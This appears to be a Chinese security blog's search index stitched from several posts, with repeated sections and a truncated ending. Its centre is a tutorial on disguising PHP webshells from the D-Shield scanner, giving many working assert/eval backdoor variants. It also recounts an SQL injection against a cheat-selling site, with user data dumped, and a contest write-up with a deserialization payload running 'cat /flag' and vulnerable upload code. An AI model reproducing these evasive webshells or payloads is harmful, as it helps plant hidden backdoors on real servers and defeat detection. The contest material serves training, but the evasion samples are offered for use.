这样的流量还是容易被检测出，这也是蚁剑的硬伤。 在这篇文章里WAF拦了蚁剑发送的其它参数时怎么操作蚁剑作者也给出了解决方案 但是这样修改的话只是针对一个编码器，不能对所有的编码器有效 最稳固的办法还是自己修改蚁剑硬编码的payload，来满足自己的需求。 本文只是抛砖引玉，没什么技术含量，还望大佬们轻喷。 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:6:0","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#最后"},{"categories":["技术文章"],"content":"\r7 参考文章https://mp.weixin.qq.com/s/uITAIt-jj3-CYKwXQqFzMw https://mp.weixin.qq.com/s/IUs3YbWKSAE2ptAw1nrJyg https://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZw https://xz.aliyun.com/t/2774 ","date":"2019-10-15","objectID":"/posts/antsword-xor-encoder/:7:0","series":null,"tags":["免杀","中国蚁剑"],"title":"蚁剑实现动态秘钥编码器解码器","uri":"/posts/antsword-xor-encoder/#参考文章"},{"categories":["技术文章"],"content":"\r1 前言php的免杀可以说是已经被说烂了。 由于php特别灵活，所产生的变种也是层出不穷 但是与此同时，D盾等waf的检测也格外严格。 有时候写的比较花，D盾虽然不认识，但他给你报一级或者二级变量函数就很难受。 写这篇文章的目的不是仅仅让大家能够bypass D盾 而是希望大家就算碰到没有见过的waf也能够掌握bypass的思路。 所以这里跟着大家一起从0开始，一步步拓展思路，免杀D盾。 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:1:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#前言"},{"categories":["技术文章"],"content":"\r2 确定免杀原型首先确定你所要免杀的原型，在此基础上对其进行编码。 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:2:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#确定免杀原型"},{"categories":["技术文章"],"content":"\r2.1 常见的PHP一句话原型 \u003c?php @eval($_POST['yzddmr6']); ?\u003e \u003c?php @assert($_POST['yzddmr6']); ?\u003e \u003c?php $ant=create_function(\"\", base64_decode('QGV2YWwoJF9QT1NUWyJhbnQiXSk7'));$ant();?\u003e \u003c?php preg_replace(\"/test/e\",$_GET[\"yzddmr6\"],\"test\"); ?\u003e ... 一般一句话的组成分为两个部分：执行跟传参 $_POST['yzddmr6']负责接收用户输入的参数 eval是负责将接收到的字符串执行 免杀也就是分为这两部分来做。 要么混淆执行部分，要么混淆传参部分，要么两者都混淆。 这里要注意一下eval跟其他函数的不同： eval 是一个语言构造器而不是一个函数，不能被可变函数调用 可变函数：通过一个变量，获取其对应的变量值，然后通过给该值增加一个括号()，让系统认为该值是一个函数，从而当做函数来执行 意思就是说`` 这样是不行的 所以在php7.x以下，assert要比eval灵活的多。 但是在php7.1以上，assert同样也变成了一种语言结构，也就无法具有可变函数的特性。 所以当你确定免杀原型为``的时候，就不能想着编码eval了，应该考虑怎么混淆传参部分。 也就是把$_POST['yzddmr6']神不知鬼不觉的传到eval里 如果确定原型是``就要考虑怎么把assert这个字符串拼接混淆。 这里有人会问了，为什么waf不直接全面封杀eval，见到eval assert就报毒呢？ 因为在实际生产中确实需要eval函数，并不是所有带eval的都是后门。 如果不分青红皂白就杀会导致误报，把正常文件杀了网站就无法正常运行了。 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:2:1","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#常见的php一句话原型"},{"categories":["技术文章"],"content":"\r3 打开语法手册翻语法手册主要关注以下几点 字符串操作函数 如何自定义函数 如何自定义类 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:3:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#打开语法手册"},{"categories":["技术文章"],"content":"\r3.1 字符串操作函数想找比较全的可以点这里 下面我列举了一些常用的字符串变形函数 base64_encode() 字符串base64编码 base64_decode() 字符串base64解码 urlencode() 字符串url编码 urldecode() 字符串url解码 bin2hex() 把 ASCII 字符的字符串转换为十六进制值。 hex2bin() 把十六进制值的字符串转换为 ASCII 字符。 chr() 从指定的 ASCII 值返回字符。 ord() 返回字符串中第一个字符的 ASCII 值。 explode() 把字符串打散为数组。 implode() 返回由数组元素组合成的字符串。 parse_str() 把查询字符串解析到变量中。 str_ireplace() 替换字符串中的一些字符（对大小写不敏感）。 str_replace() 替换字符串中的一些字符（对大小写敏感）。 str_repeat() 把字符串重复指定的次数。 str_rot13() 对字符串执行 ROT13 编码。 str_shuffle() 随机地打乱字符串中的所有字符。 str_split() 把字符串分割到数组中。 strip_tags() 剥去字符串中的 HTML 和 PHP 标签。 stripos() 返回字符串在另一字符串中第一次出现的位置（对大小写不敏感）。 stristr() 查找字符串在另一字符串中第一次出现的位置（大小写不敏感）。 strlen() 返回字符串的长度。 strpos() 返回字符串在另一字符串中第一次出现的位置（对大小写敏感）。 strrev() 反转字符串。 strripos() 查找字符串在另一字符串中最后一次出现的位置（对大小写不敏感）。 strrpos() 查找字符串在另一字符串中最后一次出现的位置（对大小写敏感）。 strstr() 查找字符串在另一字符串中的第一次出现（对大小写敏感）。 substr() 返回字符串的一部分。 substr_replace() 把字符串的一部分替换为另一个字符串。 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:3:1","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#字符串操作函数"},{"categories":["技术文章"],"content":"\r3.2 如何自定义函数https://www.runoob.com/php/php-functions.html \u003c?php function functionName() { // 要执行的代码 } ?\u003e ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:3:2","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#如何自定义函数"},{"categories":["技术文章"],"content":"\r3.3 如何自定义类https://www.runoob.com/php/php-oop.html PHP 定义类通常语法格式如下： \u003c?php class phpClass { var $var1; var $var2 = \"constant string\"; function myfunc ($arg1, $arg2) { [..] } [..] } ?\u003e 解析如下： 类使用 class 关键字后加上类名定义。 类名后的一对大括号({})内可以定义变量和方法。 类的变量使用 var 来声明, 变量也可以初始化值。 函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:3:3","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#如何自定义类"},{"categories":["技术文章"],"content":"\r4 免杀套路一般的变形对于D盾根本不起作用，被杀的妈都不认，这也是为什么D盾在webshell查杀领域比较具有权威性。 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:4:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#免杀套路"},{"categories":["技术文章"],"content":"\r4.1 常规套路首先选择一个幸运儿函数，没错，我还选的是urldecode()(将字符串URL解码) 选择我们的免杀原型`` 这里假设我以前从来不知道D盾这个玩意 首先从零开始进行一些简单的尝试 \u003c?php $a=urldecode('%61%73%73%65%72%74'); //assert $a($_GET['yzddmr6']); ?\u003e 查杀结果： 直接就一级了。。。看来D盾后来改规则了。。。 可以看到他报了变量函数，并且指明了里面的参数，那么换个变量来代替GET传参试试 \u003c?php $a=urldecode('%61%73%73%65%72%74'); $b=$_GET['yzddmr6']; $a($b); ?\u003e D盾照样报了相同的警告，那么再把参数混淆一下？ \u003c?php $a=urldecode('%61%73%73%65%72%74'); $b=urldecode(\"%5f%47%45%54\"); $c=${$b}['mr6']; $a($c); ?\u003e 这里就只报变量函数了，但是照样是1级。 再混淆一下？ \u003c?php function test(){ $a=urldecode('%61%73%73%65%72%74'); if ('a'\u003e'b'){ return ; } else return $a; } $b=urldecode('%24%5f%47%45%54%5b%27%79%7a%64%64%6d%72%36%27%5d'); $test=test(); $test($b); ?\u003e 我们发现只要满足xxx(xxxx)这种格式D盾都会报一级。 从自己这么长时间跟D盾的斗争经验来说，1级变量函数不太容易过 这里直接给大家分享一些自己总结的免杀方法。 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:4:1","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#常规套路"},{"categories":["技术文章"],"content":"\r4.2 类调用自己在webshell-venom里面一直用的类调用的方式绕过D盾 下面是webshell-venom-3.3生成的shell \u003c?php class KBFI{ function __destruct(){ $XMKD='B:YVD%'^\"\\x23\\x49\\x2a\\x33\\x36\\x51\"; return @$XMKD(\"$this-\u003eRUOK\"); } } $kbfi=new KBFI(); @$kbfi-\u003eRUOK=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6']; ?\u003e 惊了，这么长时间D盾还不杀。。。 因为实际操作中发现D盾对类变量不是很敏感，把混淆的内容都放到类里，就可以比较轻易地绕过D盾。 那么我们如何对上一部分的shell修改让他消除1级呢 \u003c?php class KBFI{ function __destruct(){ $XMKD=urldecode('%61%73%73%65%72%74'); return @$XMKD(\"$this-\u003eRUOK\"); } } $kbfi=new KBFI(); @$kbfi-\u003eRUOK=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6']; ?\u003e 会发现我们就算改了$XMKD变量后D盾也无法识别。 也就是说只要按照这个模板写出来的shell，任意修改payload都可以免杀。 这也就是为什么3.3版本可以支持任意文件免杀 不过要注意的是assert只能执行一句，必须配合eval才可以执行多句。 具体看3.3的更新日志，不再赘述。 https://yzddmr6.tk/posts/webshell-venom-3-3/ 我们已经知道了通过类的方式可以很容易的免杀D盾 所以换个写法，把传参部分写到类里也可以绕过。 \u003c?php class T{ public $t; function test(){ $this-\u003et=@$_REQUEST['mr6']; $k = urldecode('%61%73%73%65%72%74'); return $k; } } $test=new T(); $a=$test-\u003etest(); @$a($test-\u003et); ?\u003e ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:4:2","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#类调用"},{"categories":["技术文章"],"content":"\r4.3 数组包裹这是星球嘉宾九世写的一个shell，我在星球里也发过他的解析。 \u003c?php function demo($name,$value){ [$name ($value)]; } $v=$_GET['a']; $file=file_get_contents(__FILE__); preg_match(\"/assert/\",$file,$mc); preg_match(\"/GET/\",$file,$cs); $cx='_'.$cs[0]; demo($mc[0],${$cx}['a']) ?\u003e 原型就是assert($_GET['a']); demo函数是主要的执行函数 这里的$name就是要传入的assert valueæ¯_GET['a'] 其他的代码都是用来混淆这两个参数的 首先$file获取自身文件的内容 preg_match(\"/assert/\",$file,$mc);//把匹配到的assert字符串放到$mc数组里,其中第0号元素就是字符串“assert” preg_match(\"/GET/\",$file,$cs); //同理,放到了$cs[0]中 $cx='_'.$cs[0];//拼接成_GET 然后调用demo函数传入参数执行。 发现D盾对于外部$a($b)这种格式比较敏感，但是对于[$a($b)]这种就不能识别了。 所以我们只需要将$a($b)包裹进数组里即可绕过 所以按照这个套路我们可以怎么改呢 \u003c?php function demo($name,$value){ [$name($value)]; } demo(urldecode('%61%73%73%65%72%74'),$_POST['mr6']); ?\u003e ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:4:3","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#数组包裹"},{"categories":["技术文章"],"content":"\r4.4 垃圾代码填充举个例子 \u003c?php $a=urldecode('%61%73%73%65%72%74'); $b=urldecode(\"%5f%47%45%54\"); $c=${$b}['mr6']; $a($c); ?\u003e 填充垃圾代码 \u003c?php $index = 'index.html'; $index = 'index.html'; $index = 'index.html'; $index = 'index.html'; $index = 'index.html'; $index = 'index.html'; $index = 'index.html'; $index = 'index.html'; $index = 'index.html'; $index = 'index.html'; $index = 'index.html'; $a=urldecode('%61%73%73%65%72%74'); $b=urldecode(\"%5f%47%45%54\"); $c=${$b}['mr6']; $a($c); ?\u003e 玄学 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:4:4","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#垃圾代码填充"},{"categories":["技术文章"],"content":"\r4.5 POP链这是以后webshell-venom的方向。 之前以上所做的一切混淆编码都是人为的留后门，为了留后门而留后门，很容易被发现。 然而POP相当于程序的漏洞，可以看作是人造漏洞，难以被检测出。 可以写一个脚本来循环生成，自动拼接，自动生成payload。 项目还在规划中，有兴趣的同学可以一起研究一下。 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:4:5","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#pop链"},{"categories":["技术文章"],"content":"\r4.6 补充实例放一些星球里的例子吧，都是免杀的图就不重复贴了。 \u003c?php class T{ public $t; function test(){ $this-\u003et=@$_REQUEST['mr6']; $k = urldecode(\"%73%73%65%72%74\"); $a = 'a'.$k; return $a; } } $test=new T(); $a=$test-\u003etest(); @$a($test-\u003et); ?\u003e 转义号绕过 \u003c?php function Test(){ $c=[$x='a',$x.='s',$x.='s',$x.='e',$x.='r',$x.='t']; $c=$_REQUEST['a']; return [$x(\"\\\\$c\")]; } Test(); ?\u003e 类继承绕过 \u003c?php class get{ public function setName($name){ return $this -\u003e name = $name; } } class getshell extends get{ public $name = \"ass\"; public $name2 = \"ert\"; } $shell = new getshell(); $gshell = $shell -\u003e name; $gshell2 = $shell -\u003e name2; $b = $shell -\u003e setName(\"$_POST[1]\"); $s = $gshell.$gshell2; $s($b); ?\u003e 类反射绕过 \u003c?php class aassert{ public $s; } $a=new ReflectionClass('aassert'); @$a-\u003es=$_POST['mr6']; $b=substr((string)$a-\u003egetName(),1); @$b($a-\u003es); ?\u003e 极简一句话 \u003c?php $data=str_rot13(\"nffreg\"); $n=[$data,$_GET['a']]; [\"\"=\u003e$n[0]($n[1])]; ?\u003e 极简一句话2 \u003c?php $_=[$_GET['a']]; [eval(\"//愚蠢的凡人\\n\".$_[0])]; ?\u003e 不一样的匿名函数写法 参考链接：https://codeday.me/bug/20181026/327968.html \u003c?php $upper=function (){ if(isset($_GET['a'])) { $_=[$_GET['a'],$_GET['b']]; $__=array([$_[0]])[0][0]; $___=array([$_[1]])[0][0]; [$__($___)]; } }; echo [$upper()]; ?\u003e **仙法数组过D盾 搞的过程发现多维数组和数组的下标不一样可以使D盾报一级 \u003c?php $_=array([[[\"你真的很多BUG耶\",$_GET['a']]]]); eval($_[0][0][0][1]); ?\u003e 卢本伟绕过 \u003c?php $_=\"17张牌你+t+能秒我+t+ 你能秒杀我，你+n+今天能十c七张牌把t卢本伟秒了，我i当+o+场就把这个电脑屏幕吃掉+c+。__\"; $__=\"我+f+真他吗没+r+开挂__\"; $___='现+a+在麻烦直播间的所+n+有人给我站起来+e+_'; $____=$_.$__.$___; $_____=explode(\"+\",$____); $______=[$_____[9].$_____[13],$_____[19].$_____[15],$_____[1].$_____[19],$_____[20].$_____[11],'un'.'cti','o'.'n',$_GET['_']]; $_______=array($______[0].$______[1],$______[2].$______[3],$______[4].$______[5]); $________=array($_______[0].$_______[1].$_______[2]); $_________=$________[0]('$a',$______[6]); $_________('phpifno();'); ?\u003e 利用json过D盾 \u003c?php class Emp { public $a = \"\"; } $e = new Emp(); $e-\u003ea = $_GET; eval(json_decode(json_encode($e), true)['a']['code']); ?\u003e ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:4:6","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#补充实例"},{"categories":["技术文章"],"content":"\r5 最后希望通过本文的阅读让大家明白，D盾0级的免杀也没有那么难做。 套路都是差不多的，自己多动手，想一想，你肯定能做的比我更好。 ","date":"2019-10-11","objectID":"/posts/webshell-bypass-php/:5:0","series":null,"tags":["webshell","免杀"],"title":"[知识星球]WebShell免杀之PHP","uri":"/posts/webshell-bypass-php/#最后"},{"categories":["技术文章"],"content":" 上一篇 向吃鸡外挂站开炮（一） ","date":"2019-10-08","objectID":"/posts/hack-pubg-cheat-site-2/:0:0","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（二）","uri":"/posts/hack-pubg-cheat-site-2/#"},{"categories":["技术文章"],"content":"\r1 前言首先打开网站我们可以看到他的炫酷界面 暖心公告 不要脸的宣传词 ","date":"2019-10-08","objectID":"/posts/hack-pubg-cheat-site-2/:1:0","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（二）","uri":"/posts/hack-pubg-cheat-site-2/#前言"},{"categories":["技术文章"],"content":"\r2 发现注入基于tp3开发,后台/admin 尝试万能密码 提示密码错误 尝试admin admin888 提示账号不存在 两者回显不同，考虑可能存在注入 ","date":"2019-10-08","objectID":"/posts/hack-pubg-cheat-site-2/:2:0","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（二）","uri":"/posts/hack-pubg-cheat-site-2/#发现注入"},{"categories":["技术文章"],"content":"\r3 无法利用？burp抓包发送到repeater进行进一步测试 发现条件为真时返回status: -2，条件为假时返回status: -1 进一步印证了猜想，后台存在注入 扔到sqlmap跑 无法检测出注入，提示一堆404 not found 开始以为是cdn封锁了sqlmap的流量，后来发现根本没什么防护。。。虚假的cdn 于是考虑可能是cms自身过滤了一些东西 ","date":"2019-10-08","objectID":"/posts/hack-pubg-cheat-site-2/:3:0","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（二）","uri":"/posts/hack-pubg-cheat-site-2/#无法利用"},{"categories":["技术文章"],"content":"\r4 绕过过滤经过测试发现只要出现尖括号就会返回404 可以用between来绕过 这时就继续按照 条件真=\u003e-2 条件假=\u003e-1 来回显 也就满足了盲注的条件 忽然一想这个情景跟第五空间决赛的那道注入题一毛一样 真返回一个页面 假返回另一个页面 出现被过滤字符返回其它页面 并且要用between来绕过 CTF诚不欺我 所以只要在sqlmap的参数里加上--tamper=between 即可 ","date":"2019-10-08","objectID":"/posts/hack-pubg-cheat-site-2/:4:0","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（二）","uri":"/posts/hack-pubg-cheat-site-2/#绕过过滤"},{"categories":["技术文章"],"content":"\r5 最后数据库里管理员密码用的aes加密，没有秘钥，无法解密。 普通用户登录口被关闭，无法注册也无法登录。 除了脱出来一堆孤儿的信息其他也没什么用 打包一下证据，全部提交有关部门。 ","date":"2019-10-08","objectID":"/posts/hack-pubg-cheat-site-2/:5:0","series":null,"tags":["渗透"],"title":"向吃鸡外挂站开炮（二）","uri":"/posts/hack-pubg-cheat-site-2/#最后"},{"categories":["技术文章"],"content":"\r1 前言10.3 星盟安全周年庆举办了一场线上AWD比赛 参赛队伍总计31支，见到了不少熟悉的ID 神仙大战果然被暴打hhhhhh，运气好还水了一个小奖品。 学到了不少东西，今天来写一下复盘总结。 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:1:0","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#前言"},{"categories":["技术文章"],"content":"\r2 比赛规则 每个队伍分配到一个docker主机，给定web(web)/pwn(pwn)用户权限，通过特定的端口和密码进行连接； 每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍。 选手需自行登录平台熟悉自助式初始化、api提交flag等功能。初始密码为队长所设密码，队长需在比赛开始前10分钟向主办方提交密码，过期未提交视为弃权。 选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到平台上。每次成功攻击可获得5分，被攻击者扣除5分；有效攻击五分钟一轮。选手需要保证己方服务的可用性，每次服务不可用，扣除10分；服务检测五分钟一轮； 不允许使用任何形式的DOS攻击，第一次发现扣1000分，第二次发现取消比赛资格。 比赛最终结果将在10月3日晚19:00-19:30于北极星杯网络安全交流群直播公布，同时会有技术分享及抽奖活动，敬请关注。 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:2:0","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#比赛规则"},{"categories":["技术文章"],"content":"\r3 比赛开始这次比赛3个web 2个pwn 首先就是老套路，打包源码跟数据库，然后D盾扫一扫。 因为队友的分工是权限维持，自己的分工主要是get flag，就直接看漏洞吧。 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:0","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#比赛开始"},{"categories":["技术文章"],"content":"\r3.1 WEB1\r3.1.1 预留后门\r三个冰蝎一个普通一句话 难受的就是自己主要是撸批量getflag脚本的，但是冰蝎的shell怎么tm写脚本啊喵喵喵？？？ 第一时间写好了普通一句话的批量脚本 改了改让他自动提交 当时大家可能都还没修，手速快就自动交了两轮 但是可以看到10队已经上了通防脚本，返回了一个假的flag 3.1.2 反序列化sqlhelper.php最下面有这样一句 if (isset($_POST['un']) \u0026\u0026 isset($_GET['x'])){ class A{ public $name; public $male; function __destruct(){ $a = $this-\u003ename; $a($this-\u003emale); } } unserialize($_POST['un']); } $name 传个system $male传个cat /flag 就可以拿到flag了 payload: GET: ?x=yzddmr6 POST: un=O:1:\"A\":2:{s:4:\"name\";s:6:\"system\";s:4:\"male\";s:9:\"cat /flag\";}; 3.1.3 注入上传login.php \u003c?php if (isset($_POST['username'])){ include_once \"../sqlhelper.php\"; $username=$_POST['username']; $password = md5($_POST['password']); $sql = \"SELECT * FROM admin where name='$username' and password='$password';\"; $help = new sqlhelper(); $res = $help-\u003eexecute_dql($sql); echo $sql; if ($res-\u003enum_rows){ session_start(); $row = $res-\u003efetch_assoc(); $_SESSION['username'] = $username; $_SESSION['id'] = $row['id']; $_SESSION['icon'] = $row['icon']; echo \"\u003cscript\u003ealert('登录成功');window.location.href='/'\u003c/script\u003e\"; }else{ echo \"\u003cscript\u003ealert('用户名密码错误')\u003c/script\u003e\"; } } ?\u003e 可以看到直接把接收到了$username给带入到了sql语句中，产生注入 直接用万能密码就可以绕过 接着往下看登录之后可以做什么 info.php if (isset($_FILES)) { if ($_FILES[\"file\"][\"error\"] \u003e 0) { echo \"错误：\" . $_FILES[\"file\"][\"error\"] . \"\u003cbr\u003e\"; } else { $type = $_FILES[\"file\"][\"type\"]; if($type==\"image/jpeg\"){ $name =$_FILES[\"file\"][\"name\"] ; if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo \"\u003cscript\u003ealert('文件已经存在');\u003c/script\u003e\"; } else { move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"assets/images/avatars/\" . $_FILES[\"file\"][\"name\"]); $helper = new sqlhelper(); $sql = \"UPDATE admin SET icon='$name' WHERE id=$_SESSION[id]\"; $helper-\u003eexecute_dml($sql); } }else{ echo \"\u003cscript\u003ealert('不允许上传的类型');\u003c/script\u003e\"; } } } 可以看到他对文件类型的判断仅仅是if($type==\"image/jpeg\") 这里在数据包里修改content-type即可绕过，所上传的文件将会保存在assets/images/avatars/目录下。 但是由于平台数据库有点问题，无法进行注入，所以这个洞当时也没利用起来。 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:1","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#web1"},{"categories":["技术文章"],"content":"\r3.1 WEB1\r3.1.1 预留后门\r三个冰蝎一个普通一句话 难受的就是自己主要是撸批量getflag脚本的，但是冰蝎的shell怎么tm写脚本啊喵喵喵？？？ 第一时间写好了普通一句话的批量脚本 改了改让他自动提交 当时大家可能都还没修，手速快就自动交了两轮 但是可以看到10队已经上了通防脚本，返回了一个假的flag 3.1.2 反序列化sqlhelper.php最下面有这样一句 if (isset($_POST['un']) \u0026\u0026 isset($_GET['x'])){ class A{ public $name; public $male; function __destruct(){ $a = $this-\u003ename; $a($this-\u003emale); } } unserialize($_POST['un']); } $name 传个system $male传个cat /flag 就可以拿到flag了 payload: GET: ?x=yzddmr6 POST: un=O:1:\"A\":2:{s:4:\"name\";s:6:\"system\";s:4:\"male\";s:9:\"cat /flag\";}; 3.1.3 注入上传login.php \u003c?php if (isset($_POST['username'])){ include_once \"../sqlhelper.php\"; $username=$_POST['username']; $password = md5($_POST['password']); $sql = \"SELECT * FROM admin where name='$username' and password='$password';\"; $help = new sqlhelper(); $res = $help-\u003eexecute_dql($sql); echo $sql; if ($res-\u003enum_rows){ session_start(); $row = $res-\u003efetch_assoc(); $_SESSION['username'] = $username; $_SESSION['id'] = $row['id']; $_SESSION['icon'] = $row['icon']; echo \"\"; }else{ echo \"\"; } } ?\u003e 可以看到直接把接收到了$username给带入到了sql语句中，产生注入 直接用万能密码就可以绕过 接着往下看登录之后可以做什么 info.php if (isset($_FILES)) { if ($_FILES[\"file\"][\"error\"] \u003e 0) { echo \"错误：\" . $_FILES[\"file\"][\"error\"] . \" \"; } else { $type = $_FILES[\"file\"][\"type\"]; if($type==\"image/jpeg\"){ $name =$_FILES[\"file\"][\"name\"] ; if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo \"\"; } else { move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"assets/images/avatars/\" . $_FILES[\"file\"][\"name\"]); $helper = new sqlhelper(); $sql = \"UPDATE admin SET icon='$name' WHERE id=$_SESSION[id]\"; $helper-\u003eexecute_dml($sql); } }else{ echo \"\"; } } } 可以看到他对文件类型的判断仅仅是if($type==\"image/jpeg\") 这里在数据包里修改content-type即可绕过，所上传的文件将会保存在assets/images/avatars/目录下。 但是由于平台数据库有点问题，无法进行注入，所以这个洞当时也没利用起来。 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:1","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#预留后门"},{"categories":["技术文章"],"content":"\r3.1 WEB1\r3.1.1 预留后门\r三个冰蝎一个普通一句话 难受的就是自己主要是撸批量getflag脚本的，但是冰蝎的shell怎么tm写脚本啊喵喵喵？？？ 第一时间写好了普通一句话的批量脚本 改了改让他自动提交 当时大家可能都还没修，手速快就自动交了两轮 但是可以看到10队已经上了通防脚本，返回了一个假的flag 3.1.2 反序列化sqlhelper.php最下面有这样一句 if (isset($_POST['un']) \u0026\u0026 isset($_GET['x'])){ class A{ public $name; public $male; function __destruct(){ $a = $this-\u003ename; $a($this-\u003emale); } } unserialize($_POST['un']); } $name 传个system $male传个cat /flag 就可以拿到flag了 payload: GET: ?x=yzddmr6 POST: un=O:1:\"A\":2:{s:4:\"name\";s:6:\"system\";s:4:\"male\";s:9:\"cat /flag\";}; 3.1.3 注入上传login.php \u003c?php if (isset($_POST['username'])){ include_once \"../sqlhelper.php\"; $username=$_POST['username']; $password = md5($_POST['password']); $sql = \"SELECT * FROM admin where name='$username' and password='$password';\"; $help = new sqlhelper(); $res = $help-\u003eexecute_dql($sql); echo $sql; if ($res-\u003enum_rows){ session_start(); $row = $res-\u003efetch_assoc(); $_SESSION['username'] = $username; $_SESSION['id'] = $row['id']; $_SESSION['icon'] = $row['icon']; echo \"\"; }else{ echo \"\"; } } ?\u003e 可以看到直接把接收到了$username给带入到了sql语句中，产生注入 直接用万能密码就可以绕过 接着往下看登录之后可以做什么 info.php if (isset($_FILES)) { if ($_FILES[\"file\"][\"error\"] \u003e 0) { echo \"错误：\" . $_FILES[\"file\"][\"error\"] . \" \"; } else { $type = $_FILES[\"file\"][\"type\"]; if($type==\"image/jpeg\"){ $name =$_FILES[\"file\"][\"name\"] ; if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) { echo \"\"; } else { move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"assets/images/avatars/\" . $_FILES[\"file\"][\"name\"]); $helper = new sqlhelper(); $sql = \"UPDATE admin SET icon='$name' WHERE id=$_SESSION[id]\"; $helper-\u003eexecute_dml($sql); } }else{ echo \"\"; } } } 可以看到他对文件类型的判断仅仅是if($type==\"image/jpeg\") 这里在数据包里修改content-type即可绕过，所上传的文件将会保存在assets/images/avatars/目录下。 但是由于平台数据库有点问题，无法进行注入，所以这个洞当时也没利用起来。 ","date":"2019-10-04","objectID":"/posts/xm-one-year-awd/:3:1","series":null,"tags":["AWD"],"title":"“北极星杯”AWD线上赛复盘","uri":"/posts/xm-one-year-awd/#反序列化"},{"categories":["技术文章"],"content":"\r3.1 WEB1\r3.1.1 预留后门\r三个冰蝎一个普通一句话 难受的就是自己主要是撸批量getflag脚本的，但是冰蝎的shell怎么tm写脚本啊喵喵喵？？？ 第一时间写好了普通一句话的批量脚本 改了改让他自动提交 当时大家可能都还没修，手速快就自动交了两轮 但是可以看到10队已经上了通防脚本，返回了一个假的flag 3.1.2 反序列化sqlhelper.php最下面有这样一句 if (isset($_POST['un']) \u0026\u0026 isset($_GET['x'])){ class A{ public $name; public $male; function __destruct(){ $a = $this-\u003ename; $a($this-\u003emale); } } unserialize($_POST['un']); } $name 传个system $male传个cat /flag 就可以拿到flag了 payload: GET: ?x=yzddmr6 POST: un=O:1:\"A\":2:{s:4:\"name\";s:6:\"system\";s:4:\"male\";s:9:\"cat /flag\";}; 3.1.3 注入上传login.php \u003c?php if (isset($_POST['username'])){ include_once \"../sqlhelper.php\"; $username=$_POST['username']; $password = md5($_POST['password']); $sql = \"SELECT * FROM admin where name='$username' and password='$password';\"; $help = new sqlhelper(); $res = $help-\u003eexecute_dql($sql); echo $sql; if ($res-\u003enum_rows){ session_start(); $row = $res-\u003efetch_assoc(); $_SESSION['username'] = 